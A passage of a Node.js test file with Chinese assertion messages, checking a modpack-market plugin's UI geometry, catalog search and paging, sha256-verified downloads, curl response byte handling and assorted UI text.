  assert(cli.includes('const DOCK_HEAD_H = 44'), '夹边只按标题行高度算')
  assert(cli.includes('const placed = clampDockPos(pos, vp, { w: DOCK_W, h: DOCK_HEAD_H })'), '展开不会把窗口顶上去')
  assert(cli.includes('const openMaxH = Math.max(160, Math.min(DOCK_OPEN_MAX_H, vp.height - placed.y - DOCK_MARGIN))'), '展开高度按「当前位置往下还剩多少」缩，位置不动')
  assert(cli.includes('maxHeight: open ? openMaxH + "px" : "none"'), '展开用算出来的可用高度')
  assert(!cli.includes('const [size, setSize]'), '不再量尺寸（量了就会跟钳位互相打架）')
  assert(cli.includes('const placed = clampDockPos(pos, vp, { w: DOCK_W, h: DOCK_HEAD_H })') || cli.includes('const placed = clampDockPos(pos, viewportSize(), size)'), '渲染只夹边')
  assert(cli.includes('const [pos, setPos] = useState(() => dockFromFractions(readDockPos(), viewportSize()))'), '界面里的位置是像素')
  assert(cli.includes('const next = clampDockPos({ x: event.clientX - drag.dx, y: event.clientY - drag.dy }, vp, size)'), '拖动只用指针位移 + 起手尺寸')
  assert(!cli.includes('pos.fx * vp.width'), '拖动/渲染都不该再从相对坐标反推像素')
  assert(cli.includes('const pillAt = clampDockPos(pos, vp, { w: pillW, h: pillH })'), '胶囊也走同一套夹边')

  // 召回回调里调用的每个函数都必须真有定义，否则一按就 ReferenceError、整块面板被吞成空白
  const recallStart = cli.indexOf('subscribeDockReset(() => {')
  const recallEnd = recallStart < 0 ? -1 : cli.indexOf('}), [])', recallStart)
  assert(recallStart > 0 && recallEnd > recallStart, '召回回调应该在')
  const recallBody = cli.slice(recallStart, recallEnd)
  const called = [...recallBody.matchAll(/([A-Za-z_$][\w$]*)\s*\(/g)].map((m) => m[1])
  const missing = called.filter((name) => !name.startsWith('set') && !['if', 'for', 'function'].includes(name) && !cli.includes('function ' + name + '('))
  assert(missing.length === 0, '召回回调里调用了没定义的函数：' + missing.join('、'))

  // 纯函数：四种窗口 × 各种摆放，全都得落在可见区里
  const geoStart = cli.indexOf('const DOCK_TOP_INSET = 56')
  const geoEnd = cli.indexOf('// 召回：标签行那个显眼按钮')
  assert(geoStart > 0 && geoEnd > geoStart, '几何函数要能单独取出来测')
  const geo = new Function(cli.slice(geoStart, geoEnd) + '\nreturn { clampDockPos, dockFromFractions, DOCK_W, DOCK_OPEN_MAX_H, DOCK_TOP_INSET, DOCK_MARGIN };')()
  const { clampDockPos, dockFromFractions, DOCK_W, DOCK_TOP_INSET } = geo
  const viewports = [[1920, 1080], [1280, 800], [800, 600], [420, 520]]
  for (const [vw, vh] of viewports) {
    const viewport = { width: vw, height: vh }
    const openSize = { w: DOCK_W, h: 420 }
    // 没有位置时落右下角
    const fallback = clampDockPos(null, viewport, { w: DOCK_W, h: 44 })
    assert(fallback.x === vw - DOCK_W - 12 && fallback.y === vh - 44 - 12, vw + 'x' + vh + ' 默认位置该在右下角：' + JSON.stringify(fallback))
    for (const pos of [{ x: -999, y: -999 }, { x: 99999, y: 99999 }, { x: 40, y: 40 }, { x: vw / 2, y: vh / 2 }]) {
      for (const size of [{ w: DOCK_W, h: 44 }, openSize]) {
        const at = clampDockPos(pos, viewport, size)
        assert(at.x >= 4 && at.x <= Math.max(4, vw - size.w - 4), '横向出界了：' + vw + 'x' + vh + ' ' + JSON.stringify(pos) + ' -> ' + JSON.stringify(at))
        assert(at.y >= DOCK_TOP_INSET && at.y <= Math.max(DOCK_TOP_INSET, vh - size.h - 4), '纵向出界了：' + vw + 'x' + vh + ' ' + JSON.stringify(pos) + ' -> ' + JSON.stringify(at))
      }
    }
    // 同一相对坐标在更大视口里要跟着往外走
    const small = dockFromFractions({ fx: 0.5, fy: 0.5 }, { width: 800, height: 600 })
    const big = dockFromFractions({ fx: 0.5, fy: 0.5 }, { width: 1600, height: 1000 })
    assert(small.x === 400 && small.y === 300 && big.x === 800 && big.y === 500, '相对坐标要按比例还原')
  }
})
test('解除卡顿：本机装了 dsh-unlag 才出按钮，悬浮写明来源', () => {
  const cli = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  assert(cli.includes('const UNLAG_STATE_ROUTE = "/dsh-unlag/state"'), '检测要用它自己的 state 接口')
  assert(cli.includes('"x-dsh-unlag": "1"'), '按下要带它要求的头，否则 403')
  assert(cli.includes('/dsh-unlag/reload?requestId='), '按钮就是让它整理一次')
  assert(cli.includes('来自插件市场的 dsh-unlag@'), '悬浮要写明来源与版本，别让人以为是本插件功能')
  assert(cli.includes('typeof data.version === "string"'), '读不到版本就当没装，别硬塞按钮')
})

test('整合包市场：目录形状、检索、分类与分页都在服务端算', () => {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-modpack-market-'))
  const previous = process.env.DSH_HOME
  process.env.DSH_HOME = home
  try {
    const config = { ...DEFAULT_CONFIG }
    const dir = path.join(home, 'dsh-modpack', 'modpack-market')
    fs.mkdirSync(dir, { recursive: true })
    const pack = (id, name, category, extra) => ({
      id, name, author: 'tester', category, version: '1.0.0', strategy: 'lite',
      file: id + '-lite.dshpack', sha256: 'a'.repeat(64), size: 2048, createdAt: '2026-11-27',
      description: { zh: name + ' 的说明', en: '' }, plugins: [{ name: 'demo-' + id, version: '1.0.0' }], downloads: 10,
      ...extra,
    })
    const data = {
      schema: 1,
      builtAt: '2026-11-27T00:00:00Z',
      count: 3,
      categories: [{ id: 'util', label: '实用功能', count: 2 }, { id: 'ui', label: '界面美化', count: 1 }],
      packs: [pack('a-pack', '甲包', '实用功能'), pack('b-pack', '乙包', '实用功能'), pack('c-pack', '丙包', '界面美化')],
    }
    fs.writeFileSync(path.join(dir, 'packs.cache.json'), JSON.stringify({
      fetchedAt: Date.now(),
      source: 'https://example.com/packs.json',
      sourceBase: 'https://example.com/market',
      data,
    }), 'utf8')

    const summary = marketSummary(config)
    assert(summary.present === true && summary.count === 3, '缓存写得对就该读得出 3 个')
    assert(summary.stale === false, '刚写进去的不该算过期')

    const all = searchMarket(config, { page: 1, pageSize: 2, installed: ['demo-a-pack'] })
    assert(all.ok === true && all.total === 3 && all.items.length === 2 && all.hasMore === true, '一页 2 条、还有下一页')
    assert(all.items[0].installed.all === true, '已装的排前面，并且标出来')
    assert(/\/market\/packs\/a-pack-lite\.dshpack$/u.test(all.items[0].url), '包地址要用缓存的 sourceBase 拼')

    const page2 = searchMarket(config, { page: 2, pageSize: 2 })
    assert(page2.items.length === 1 && page2.hasMore === false, '第二页只剩 1 条')

    const byCategory = searchMarket(config, { category: '界面美化', page: 1, pageSize: 10 })
    assert(byCategory.total === 1 && byCategory.items[0].id === 'c-pack', '分类要能用中文标签筛')

    const byQuery = searchMarket(config, { query: '乙包', page: 1, pageSize: 10 })
    assert(byQuery.total === 1 && byQuery.items[0].id === 'b-pack', '按名字搜得到')

    const byPlugin = searchMarket(config, { query: 'demo-c-pack', page: 1, pageSize: 10 })
    assert(byPlugin.total === 1 && byPlugin.items[0].id === 'c-pack', '按包内插件名也搜得到')

    const found = findMarketPack(config, 'b-pack')
    assert(found.ok === true && found.pack.id === 'b-pack', '按 id 找条目')
    assert(findMarketPack(config, 'nope').ok === false, '没有的 id 要明说没有')
  } finally {
    if (previous === undefined) delete process.env.DSH_HOME
    else process.env.DSH_HOME = previous
    fs.rmSync(home, { recursive: true, force: true })
  }
})

test('整合包市场：页面入口、下载交接、附属开关与规则页都在', () => {
  const cli = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  assert(cli.includes('function MarketPanel(props)'), '要有独立的整合包市场面板')
  assert(cli.includes('["market", "社区资源"]'), '标签行要多一栏「社区资源」')
  assert(cli.includes('showModpackMarket === false'), '设置里关掉就不显示那一栏')
  assert(cli.includes('const installRequest = { value: null, subs: new Set() }'), '市场到安装页只交接一次')
  assert(cli.includes('requestInstall({ token: data.token, fileName: data.fileName, packName: pack.name })'), '下载完把 token 递过去')
  assert(cli.includes('api("/inspect", { token: payload.token })'), '安装页接到之后仍走原来的识别')
  assert(cli.includes('上传方式与规则'), '规则要有独立页面')
  assert(cli.includes('只收轻量包（strategy: lite）'), '规则里要写明当前只收轻量包')
  assert(cli.includes('条目里不要写介绍、名称、作者、插件清单'), '规则要写明介绍取自包内 dsh-modpack.json，不写在条目里')
  assert(!cli.includes('"name": "B站三件套"'), '清单示例不该再示范在条目里写 name/description，避免两套说法')
  assert(cli.includes('下载码'), '详情页要有下载码（直链 + sha256）')
  assert(cli.includes('这个整合包是做什么的'), '详情里要有整合包介绍')
  assert(cli.includes('包含的插件（这些插件会干什么）'), '要列出包内插件与用途')
  assert(cli.includes('MarketPanel, { key: "market-" + gen'), '市场面板也要跟着刷新重挂')
  assert(cli.includes('还没有整合包目录'), '接口没就绪时要给一句人话，而不是只丢 HTTP 代号')
  assert(cli.includes('重启一次 DSH 后生效'), '404/405 要提示重启宿主')
  assert(cli.includes('这个接口在当前运行的 DSH 里还没加载'), '旧宿主上的 405 要说清原因')
  assert(cli.includes('这个类型下还没有整合包'), '目录为空时要显示空态')
  assert(cli.includes('没有匹配的整合包'), '搜不到要有空态与清空按钮')
  assert(cli.includes('function ModpackBrowser(props)'), '整包浏览要独立成一层，外面再包左侧大类')
  assert(cli.includes('railBtn("modpack", "整合包"') && cli.includes('railBtn("plugin", "插件"'), '左侧要有「整合包」「插件」两个大类')
  assert(cli.includes('请先安装插件市场'), '没装插件市场时「插件」这一类要提示去装，而不是给空列表')
  assert(cli.includes('「插件」这一类直接读插件市场（dshmarket）的目录与检索'), '插件分类要说明功能基于插件市场')
  assert(cli.includes('api("/catalog/search", { query, category, sort, page: 1, pageSize: 20 })'), '插件分类复用市场目录的检索接口')
  assert(cli.includes('function CategoryChips(props)'), '分类胶囊要抽成两处共用的一份')
  assert(cli.includes('h(CategoryChips, { chips, value: category, onChange: setCategory })'), '插件分类要用与打包页同一套胶囊')
  assert(cli.includes('h(CategoryChips, { chips, value: category, onChange: setCategory })') && cli.includes('跟打包页同一套：分类、搜索、已装优先'), '插件分类的检索口径要跟打包页一致')
  assert(cli.includes('tab === "market" ? null :'), '打包/安装的安全说明不该出现在社区资源里')
  assert(cli.includes('const retry = () =>'), '加载失败要能重试')
  assert(cli.includes('[reloadKey]'), '重试要靠 reloadKey 重新拉一次')
  assert(cli.includes('搜索整合包'), '搜索面板照 PCL 的标题')
  assert(cli.includes('重置条件') && cli.includes('安装已有整合包'), 'PCL 右下三个按钮里能做的两个要有')
  assert(!cli.includes('"来源"'), 'PCL 的「来源」筛选我们没有：不摆出来')
  assert(cli.includes('const renderRow = (pack) => {'), '列表改成 PCL 那种一行一个的行式布局')
  const index = fs.readFileSync(new URL('../index.js', import.meta.url), 'utf8')
  assert(index.includes("route('/dsh-modpack-kit/api/market'"), '要有目录接口')
  assert(index.includes("route('/dsh-modpack-kit/api/market/search'"), '检索走服务端')
  assert(index.includes("route('/dsh-modpack-kit/api/market/download'"), '下载走服务端并换 token')
  assert(index.includes('createHash(\'sha256\').update(bytes).digest(\'hex\')'), '下载后要核对 sha256')
  assert(index.includes('pack.size > 0 && bytes.length !== pack.size'), '体积对不上也要拦')
  assert(index.includes('showModpackMarket !== false'), '默认开启：只有显式关掉才不补目录')
  const store = fs.readFileSync(new URL('../lib/store.mjs', import.meta.url), 'utf8')
  assert(/showModpackMarket: true/u.test(store), '默认开启')
  assert(/modpackRefreshHours: 24/u.test(store), '默认一天一轮询')
})

test('curl 兜底要保留原始字节（中文 JSON 不能被重新编码）', () => {
  const body = Buffer.from(JSON.stringify({ name: '效率三件套', note: '中文与 emoji 🚀' }), 'utf8')
  const raw = Buffer.concat([Buffer.from('HTTP/1.1 200 OK\r\ncontent-type: application/json\r\n\r\n', 'latin1'), body])
  const parsed = parseCurlResponse(raw)
  assert(parsed.status === 200, '状态码要读出来')
  assert(parsed.body.equals(body), '正文必须逐字节一致，不能按 utf8 解码再 latin1 回写')
  const json = JSON.parse(parsed.body.toString('utf8'))
  assert(json.name === '效率三件套' && json.note.includes('🚀'), '解析回来中文与 emoji 不能坏')
  const src = fs.readFileSync(new URL('../lib/net.mjs', import.meta.url), 'utf8')
  assert(src.includes("encoding: 'buffer'"), 'execFile 必须拿 Buffer，而不是先解成字符串')
  assert(!src.includes("Buffer.from(stdout, 'latin1')"), '不要再用 latin1 把字符串转回 Buffer')
})

test('分组重名：不同包用同一个组名时，后来者加数字后缀，同一个包再装不重复建组', () => {
  const profile = tmpDir('group-rename')
  fs.mkdirSync(path.join(profile, '.dsh-market'), { recursive: true })
  fs.writeFileSync(path.join(profile, '.dsh-market', 'state.json'), JSON.stringify({ groups: {}, groupOrder: [] }), 'utf8')
  const first = applyMarketGroups(profile, { 日常: ['dsh-context'] }, { packKey: 'pack-a' })
  assert(first.changed === true, '第一次要写进去')
  const second = applyMarketGroups(profile, { 日常: ['dsh-ops'] }, { packKey: 'pack-b' })
  assert(second.changed === true, '第二个包也要写进去')
  assert(Boolean(second.renames && second.renames['日常']), '撞名要报出改名')
  const state = JSON.parse(fs.readFileSync(path.join(profile, '.dsh-market', 'state.json'), 'utf8'))
  assert(Array.isArray(state.groups['日常']) && state.groups['日常'].includes('dsh-context'), '原来的组不能被动')
  assert(Array.isArray(state.groups['日常 2']) && state.groups['日常 2'].includes('dsh-ops'), '撞名的要落到「日常 2」')
  assert(state.groupOrigins['日常'] === 'pack-a' && state.groupOrigins['日常 2'] === 'pack-b', '来源要分开记')
  const again = applyMarketGroups(profile, { 日常: ['dsh-whale-widget'] }, { packKey: 'pack-a' })
  assert(again.changed === true, '同一个包再装要能并进原组')
  const after = JSON.parse(fs.readFileSync(path.join(profile, '.dsh-market', 'state.json'), 'utf8'))
  assert(after.groups['日常'].includes('dsh-whale-widget'), '同源并回「日常」')
  assert(after.groups['日常 3'] === undefined, '不该再建新组')
})

test('下载量按安装文件本身算，语言切换相关代码已全部移除', () => {
  const catalog = fs.readFileSync(new URL('../lib/modpack-catalog.mjs', import.meta.url), 'utf8')
  assert(/downloads: Number\.isFinite\(Number\(pack\.downloads\)\)/u.test(catalog), '下载量只认条目自己的字段，没有就存 null')
  const store = fs.readFileSync(new URL('../lib/store.mjs', import.meta.url), 'utf8')
  assert(!store.includes('uiLocale'), '配置里不该再有 uiLocale')
  const cli = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  for (const gone of ['localeStore', 'setLocale', 'useLocale', 'uiLocale', 'Interface language']) {
    assert(!cli.includes(gone), '语言切换要彻底去掉，不能再留：' + gone)
  }
  assert(/const descOf = \(pack\) => \{/u.test(cli), '说明取中文优先')
  assert(cli.includes('下载量未统计'), '没有计数渠道就显示未统计，不能假装 0')
})
test('体量词条与水槽：按插件总数自动分档，类型太杂归到水槽，语言切换立刻生效', () => {
  const catalog = fs.readFileSync(new URL('../lib/modpack-catalog.mjs', import.meta.url), 'utf8')
  assert(/export function tierOf/u.test(catalog), '体量档位要有纯函数')
  assert(/\{ id: 'small', min: 0, max: 3 \}/u.test(catalog), '0-3 轻量')
  assert(/\{ id: 'medium', min: 4, max: 8 \}/u.test(catalog), '4-8 中型')
  assert(/\{ id: 'large', min: 9, max: 12 \}/u.test(catalog), '9-12 大型')
  assert(/id: 'huge', min: 13/u.test(catalog), '13+ 大宗')
  assert(catalog.includes("{ id: 'sink', label: '水槽' }"), '分类里要有水槽')
  const builder = fs.readFileSync(new URL('../../_market/modpack-catalog/scripts/build.mjs', import.meta.url), 'utf8')
  assert(/function tierOf\(count\)/u.test(builder), '构建脚本也要算档位')
  assert(builder.includes("pack.category = '水槽'"), '三种以上场景就归到水槽')
  assert(/kinds.size >= 3/u.test(builder), '水槽判定看插件分类种类数')
  const cli = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  for (const piece of ['const tierInfo', 'const tierTag', 'TIER_LABELS', '轻量', '大宗']) {
    assert(cli.includes(piece), '缺少：' + piece)
  }
  // 语言按钮高亮跟当前语言走：切页回来不能停在中文
})

test('代码地图：每个模块都有一行去处，大文件有区块注释（省得下次满仓找）', () => {
  const map = fs.readFileSync(new URL('../docs/CODE-MAP.md', import.meta.url), 'utf8')
  const libs = fs.readdirSync(new URL('../lib/', import.meta.url)).filter((f) => f.endsWith('.mjs'))
  assert(map.includes('CODE-MAP'), '要有标题')
  assert(map.includes('功能 → 去哪找'), '要有「功能 → 去哪找」表')
  assert(map.includes('常见改动的连锁清单'), '要有连锁改动清单')
  for (const file of ['index.js', 'client.js', 'assets/install-stub.mjs']) assert(map.includes(file), '地图里缺 ' + file)
  for (const file of libs) assert(map.includes('lib/' + file), '地图里缺 lib/' + file)
  assert(libs.length >= 15, '库文件数量应不少于 15 个')
  const cli = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  const sections = ['PackPanel', 'InstallPanel', 'MarketPanel', 'SettingsPanel', 'JobDock', 'Home']
  for (const name of sections) assert(cli.includes('// ===== [区块] ') && cli.includes('：' + name + ' ====='), '缺区块注释：' + name)
  assert(cli.includes('docs/CODE-MAP.md'), 'client.js 头部要指向代码地图')
  const idx = fs.readFileSync(new URL('../index.js', import.meta.url), 'utf8')
  assert(idx.includes('docs/CODE-MAP.md'), 'index.js 头部要指向代码地图')
  assert(idx.includes('readJsonBody(req)'), '路由体写法要写进文件头')
})
test('社区资源：连点五次标签会闪 1 秒那句自嘲，且改名后旧名字不再出现', () => {
  const cli = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  assert(cli.includes('不不不，我资源无疑是贫乏的'), '彩蛋文案要在')
  assert(cli.includes('eggClicks.current.length < 5'), '五次以内不该触发')
  assert(cli.includes('now - at < 1500'), '连点窗口是 1.5 秒')
  assert(cli.includes('setTimeout(() => { eggTimer.current = 0; setEggMsg("") }, 1000)'), '提示只留 1 秒')
  assert(cli.includes('if (key === "market") spotEgg()'), '点「社区资源」标签时计数')
  assert(cli.includes('const eggNode = eggMsg'), '提示条要渲染出来')
  assert(!cli.includes('"整合包市场"'), '旧名字不该再出现在界面文案里')
  assert(!cli.includes('显示「整合包市场」'), '设置里的开关文案也要改名')
})

test('社区资源：分类名助手要先定义再给分类下拉用（避免 TDZ 白屏）', () => {
  const cli = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  const cat = cli.indexOf('const catLabel = (name) =>')
  const chips = cli.indexOf('const chips = [{ id: "all"')
  assert(cat > 0 && chips > 0, '两个都要在')
  assert(cat < chips, 'catLabel 必须在 chips 之前定义，否则分类下拉一渲染就 ReferenceError')
})

test('打包版本只记客户端给的那一版，不向 registry 校验；兼容建议跟打包策略走', () => {
  const pack = fs.readFileSync(new URL('../lib/pack.mjs', import.meta.url), 'utf8')
  assert(!/Object\.keys\(versions\)\[0\]/u.test(pack), '不能再用 versions 的第一个键当版本（那是最老的版本）')
  assert(!pack.includes('npmMetadata'), '打包时不再向 registry 要元数据')
  assert(!pack.includes("import { npmMetadata }"), '不再 import registry 元数据')
  assert(!pack.includes("'dist-tags'"), '打包不再看 dist-tags（市场身份在安装时联网确认）')
  assert(/parseSpecVersion/u.test(pack), '要从 名字@版本 里解析版本号')
  assert(pack.includes('客户端给什么版本号就记什么'), '注释说明打包器不替注册表当裁判')
  const compat = fs.readFileSync(new URL('../lib/compat.mjs', import.meta.url), 'utf8')
  assert(!compat.includes('没有 dsh 段'), '没有 dsh 段不再算建议')
  assert(!compat.includes('not-bundle'), '去掉 not-bundle 判定')
  assert(/const canCarry = format === 'full' \|\| format === 'hybrid'/u.test(compat), '建议按策略给')
  assert(compat.includes('轻量包只记版本、不带别的东西'), '轻量包的依赖建议要写清楚')
  assert(/if \(canCarry && !plugin\.license\)/u.test(compat), '轻量包不再提许可证')
})

for (const [state, name, detail] of results) {
  if (state === 'ok') console.log('ok   ' + name)
  else console.log('FAIL ' + name + '\n' + detail)
}

console.log('\n' + (results.length - failed) + '/' + results.length + ' 通过')
process.exitCode = failed === 0 ? 0 : 1
